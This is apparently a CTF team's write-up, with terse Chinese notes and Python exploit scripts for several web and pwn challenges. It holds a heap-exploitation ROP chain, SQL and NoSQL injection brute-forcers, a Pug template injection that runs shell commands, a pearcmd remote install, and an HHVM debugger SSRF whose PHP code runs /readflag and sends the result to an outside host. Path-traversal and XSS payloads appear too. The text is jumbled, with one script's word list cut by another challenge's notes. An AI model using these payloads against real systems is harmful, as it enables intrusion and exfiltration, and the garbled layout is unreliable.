    s.sendlineafter(b"Size: ",str(size).encode())
    s.sendafter("Title: ",title)
    s.sendafter("Note: ",note)
def show(idx):
    s.sendlineafter(b">>",b"2")
    s.sendlineafter(b"Index: ",str(idx).encode())
def free(idx):
    s.sendlineafter(b">>",b"3")
    s.sendlineafter(b"Index: ",str(idx).encode())
def edit(idx,note):
    s.sendlineafter(b">>",b"4")
    s.sendlineafter(b"Index: ",str(idx).encode())
    s.sendafter(b"Note: ",note)
# s = process("./warmnote")
s = remote("124.70.137.88","20000")
add(0x30,b'A'*16,b'A'*0x30)
add(0x30,b'A'*16,b'A'*0x30)
add(0x30,b'A'*16,b'A'*0x30)
free(0)
free(1)
add(0x30,b'A'*16,b'A'*0x30)
add(0xa9c,b'A'*16,b'dead\n')
show(1)
libc = ELF("./libc.so")
libc.address = u64(s.recvuntil("\x7f")[-6:]+b"\x00\x00")+0x1ff0
success(hex(libc.address))
secret_addr = libc.address+0xb4ac0
s.sendlineafter(b">>",b"666")
s.sendlineafter(b"[IN]: ",str(secret_addr).encode())
s.recvuntil(b"[OUT]: ")
secret = u64(s.recv(8))
success(hex(secret))
free(2)
free(3)
free(0)
stdin_FILE = libc.address+0xb4180
fake_mem_addr = libc.address-0xac0
fake_meta_addr = libc.address-0xff0
fake_mem = p64(fake_meta_addr)+p64(1)
sc = 10 # 0xbc
freeable = 1
last_idx = 1
maplen = 2
fake_meta = p64(stdin_FILE-0x18)#next
fake_meta += p64(fake_mem_addr)#priv
fake_meta += p64(fake_mem_addr)
fake_meta += p64(2)
fake_meta += p64((maplen >",b"1")
s.sendlineafter(b"Size: ",str(0xbc).encode())
s.sendafter("Title: ",b'A'*16)
stdout_FILE=libc.address+0xb4280
ret = libc.address+0x00000000000152a2
pop_rdi = libc.address+0x00000000000152a1
pop_rsi = libc.address+0x000000000001dad9
pop_rdx = libc.address+0x000000000002cdae
mov_rsp = libc.address+0x000000000007b1f5
syscall = libc.address+0x00000000000238f0
pop_rcx = libc.address+0x0000000000016dd5
pop_rax = libc.address+0x0000000000016a96
payload = p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(stdout_FILE-70)+p64(pop_rdx)+p64(0x300)
payload += p64(libc.sym['read'])
payload = payload.ljust(64,b'\x00')
payload += b'A'*32+p64(1)+p64(1)+p64(stdout_FILE-64)+p64(ret)+p64(3)+p64(mov_rsp)+b"\n"
s.send(payload)
payload = b'./flag\x00'
payload = payload.ljust(30,b'\x00')
payload += p64(pop_rdi)+p64(stdout_FILE-
70)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall)
payload += 
p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(stdout_FILE+0x100)+p64(pop_rdx)+p64(0x50)+p64(libc
.sym['read'])
payload += 
p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(stdout_FILE+0x100)+p64(pop_rdx)+p64(0x500)+p64(lib
c.sym['write'])
s.send(payload)
s.interactive()
ns_shaft_sql
#-*-coding=utf-8-*-
import requests
import base64
import threading
s = requests.Session()
url = "http://124.71.132.232:23334/"
def execute(query):
    global s,url
    query = base64.b64encode(query)
    res = s.get(url+"?sql="+query).text
    print(res)
    k = res.split("Your key is ")[1].split('\n')[0].strip()
    return k
def create_func():
    c_query = '''select 123;'''
    print(c_query)
    return execute(c_query)
k = create_func()
l = '''ASCII
CHAR_LENGTH
CHARACTER_LENGTH
CONCAT
CONCAT_WS
FIELD
FIND_IN_SET
FORMAT
INSERT
INSTR
LCASE
LEFT
LENGTH
LOCATE
LOWER
LPAD
LTRIM
MID
POSITION
REPEAT
REPLACE
REVERSE
RIGHT
RPAD
RTRIM
SPACE
STRCMP
SUBSTR
SUBSTRING
SUBSTRING_INDEX
TRIM
UCASE
UPPER
ABS
ACOS
ASIN
ATAN
ATAN2
AVG
CEIL
CEILING
COS
COT
COUNT
DEGREES
DIV
EXP
FLOOR
GREATEST
LEAST
LN
LOG
LOG10
LOG2
MAX
MIN
MOD
PI
POW
POWER
RADIANS
RAND
ROUND
SIGN
SIN
SQRT
SUM
TAN
TRUNCATE
ADDDATE
ADDTIME
CURDATE
CURRENT_DATE
CURRENT_TIME
CURRENT_TIMESTAMP
CURTIME
DATE
DATE_ADD
DATE_FORMAT
DATE_SUB
DATEDIFF
DAY
DAYNAME
DAYOFMONTH
DAYOFWEEK
DAYOFYEAR
EXTRACT
FROM_DAYS
HOUR
LAST_DAY
LOCALTIME
LOCALTIMESTAMP
MAKEDATE
MAKETIME
MICROSECOND
MINUTE
MONTH
MONTHNAME
NOW
PERIOD_ADD
PERIOD_DIFF
QUARTER
SEC_TO_TIME
SECOND
STR_TO_DATE
SUBDATE
SUBTIME
SYSDATE
TIME
TIME_FORMAT
TIME_TO_SEC
TIMEDIFF
TIMESTAMP
TO_DAYS
WEEK
WEEKDAY
WEEKOFYEAR
YEAR
YEARWEEK
BIN
BINARY
CASE
CAST
COALESCE
CandyShop
nosql注⼊+pug模板注⼊
跑出密码之后登录
POST /shop/order
username=1&candyname=1&address='+flag=global.process.mainModule.constructor._load('child_process').
execSync("cat+/flag").toString()+a='
CONNECTION_ID
CONV
CONVERT
CURRENT_USER
DATABASE
IF
IFNULL
ISNULL
LAST_INSERT_ID
NULLIF
SESSION_USER
SYSTEM_USER
USER
VERSION
ENCRYPT
MD5
OLD_PASSWORD
PASSWORD'''
l = l.split("\n")
for i in l:
    execute("set @@sql_mode:=(select concat(0x22,v) from s  where `k`='"+k+"')/*"+i+"
(1,1,1)*/;")
import requests as req
chars = '0123456789abcdef'
ans = ''
j = 0
for pos in range(1,64):
    for ch in chars:
        data = {'username':'rabbit','password[$regex]':'^'+ans+ch+'.*$'}
        res = req.post('http://123.60.21.23:23333/user/login',data )
        #res = req.post('http://127.0.0.1:3000/user/login',data )
        if 'Bad' in res.text:
            ans += ch
            break
    print(pos,ans)
VerySafe
?list+install+—installroot+/tmp/+http://49.234.52.70:8080/++++++++++++++$&f=pearcmd&
hiphop
hhvm/4.126.0
to enable the debugging extension
to optionally change the port the debugger listens on (default:
)
hhvm -mserver-dhhvm.server.thread_count=100 -dhhvm.http.default_timeout=1 -
dhhvm.server.connection_timeout_seconds=1 -dhhvm.debugger.vs_debug_enable=1 -
dhhvm.server.port=8080 -dhhvm.repo.central.path=/tmp/hhvm.hhbc -
dhhvm.pid_file=/tmp/hhvm.pid -dhhvm.server.whitelist_exec=true -
dhhvm.server.allowed_exec_cmds[]= -dhhvm.server.request_timeout_seconds=1 -
dopen_basedir=/var/www/html
hhvm.debugger.vs_debug_enable=1
hhvm.debugger.vs_debug_listen_port=
8999
import requests
import urllib
import json
payload = 
'''%7b%22command%22%3a%22attach%22%2c%22arguments%22%3a%7b%22name%22%3a%22hhvm%3a%20att
ach%20to%20server%22%2c%22type%22%3a%22hhvm%22%2c%22request%22%3a%22attach%22%2c%22host
%22%3a%22localhost%22%2c%22port%22%3a8998%2c%22remotesiteroot%22%3a%22%2fvar%2fwww%2fpu
blic%2f%22%2c%22localworkspaceroot%22%3a%22%2fvar%2fwww%2fpublic%2f%22%2c%22__configura
tiontarget%22%3a5%2c%22__sessionid%22%3a%22052f86e6-5d6a-4e7c-b049-
a4ffa373b365%22%2c%22sandboxuser%22%3a%22wupco%22%7d%2c%22type%22%3a%22request%22%2c%22
seq%22%3a2%7d%00%7b%22command%22%3a%22initialize%22%2c%22arguments%22%3a%7b%22clientid%
22%3a%22vscode%22%2c%22clientname%22%3a%22visual%20studio%20code%22%2c%22adapterid%22%3
a%22hhvm%22%2c%22pathformat%22%3a%22path%22%2c%22linesstartat1%22%3atrue%2c%22columnsst
artat1%22%3atrue%2c%22supportsvariabletype%22%3atrue%2c%22supportsvariablepaging%22%3at
rue%2c%22supportsruninterminalrequest%22%3atrue%2c%22locale%22%3a%22zh-
cn%22%2c%22supportsprogressreporting%22%3atrue%2c%22supportsinvalidatedevent%22%3atrue%
2c%22supportsmemoryreferences%22%3atrue%7d%2c%22type%22%3a%22request%22%2c%22seq%22%3a1
%7d%00%7b%22command%22%3a%22evaluate%22%2c%22arguments%22%3a%7b%22expression%22%3a%22fi
le%28%27http%3a%2f%2fphp.ebcece08.o53.xyz%2f%3ftest%27%29%3b%22%2c%22context%22%3a%22re
pl%22%7d%2c%22type%22%3a%22request%22%2c%22seq%22%3a3%7d%00'''
Easyphp
/login/..;/admin 过nginx，由于flight会⾃动urldecode⼀次，%3flogin能过flight对url login字符的判断。
最后读⽂件路径2次url编码
/login/..;/admin%3flogin=aa&data=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32
%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%
25%32%66%25%32%65%25%32%65%25%32%66%25%36%36%25%36%63%25%36%31%25%36%37
xss it?
bypass DOMPurify 2.3.1，最新版
https://github.com/cure53/DOMPurify/wiki/Security-Goals-&-Threat-Model#non-goals
考虑css反射
https://github.com/dxa4481/cssInjection
payload = urllib.unquote(payload)
phpcode = '''
$handle = popen("/readflag", "r");
$read = fread($handle, 2096);
file('http://php.ebcece08.o53.xyz/?a='.urlencode($read));
'''
phpcode = json.dumps(phpcode)
payload = payload.replace("\"file('http://php.ebcece08.o53.xyz/?test');\"", phpcode)
print(payload)
payload = urllib.quote(urllib.quote(payload))
payload = "gopher://127.0.0.1:8999/_"+payload
requests.get("http://124.71.132.232:58080/?url="+payload)
?asoul={"compileDebug":1,"filename":"aaaa\u2028function%20escapeFn()
{alert(__lines)}//","client":false,"jiaran":"a","xiangwan":"b","beila":"c","jiale":"d","nailin":"e"}
EasySQLi
Reverse
sakuretsu
Program Logic:
Pipes Game
Key Logic:
main → 413C20 (wrapper)
→ 413150 (main checker, connects tube using DFS in a iterative way)
→ 4126B0 (checks if a direction needs to be processed)
→ 412A00 (checks if two block's tube can be connected)
# -*- coding:utf8 -*-